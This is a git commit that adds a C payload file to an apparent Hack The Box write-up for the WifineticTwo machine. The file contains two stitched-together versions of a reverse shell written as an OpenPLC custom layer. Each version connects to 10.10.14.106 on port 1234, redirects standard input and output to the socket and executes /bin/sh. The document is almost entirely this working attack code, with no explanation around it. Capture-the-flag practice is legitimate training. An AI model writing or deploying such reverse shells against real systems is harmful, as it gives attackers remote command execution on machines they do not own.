f5f2ecf0b17ded28e1f2a309abe70433b321150f
eddym@lou <eddymalou@localhost.localdomain>
2024-07-05 14:54:55 +0200

    Add WifineticTwo HTB medium difficulty writeup

---
+++ HTB/medium/WifineticTwo/payload.c
@@ -0,0 +1,89 @@
+#include "ladder.h"
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int ignored_bool_inputs[] = {-1};
+int ignored_bool_outputs[] = {-1};
+int ignored_int_inputs[] = {-1};
+int ignored_int_outputs[] = {-1};
+
+void initCustomLayer()
+{
+    int port = 1234;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.106");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
+
+    return 0;
+}
+
+void updateCustomIn()
+{
+}
+
+void updateCustomOut()
+{ 
+}
+#include "ladder.h"
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int ignored_bool_inputs[] = {-1};
+int ignored_bool_outputs[] = {-1};
+int ignored_int_inputs[] = {-1};
+int ignored_int_outputs[] = {-1};
+
+void initCustomLayer()
+{
+    char *ip = "10.10.14.106";
+    int port = 1234;
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        return; 
+    }
+    
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    inet_pton(AF_INET, ip, &addr.sin_addr);
+
+    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
+        close(sockfd);
+        return; 
+    }
+    
+    dup2(sockfd, 0); 
+    dup2(sockfd, 1); 
+    dup2(sockfd, 2); 
+
+    execve("/bin/sh", NULL, NULL);
+}
+
+void updateCustomIn()
+{
+}
+
+void updateCustomOut()
+{ 
+}
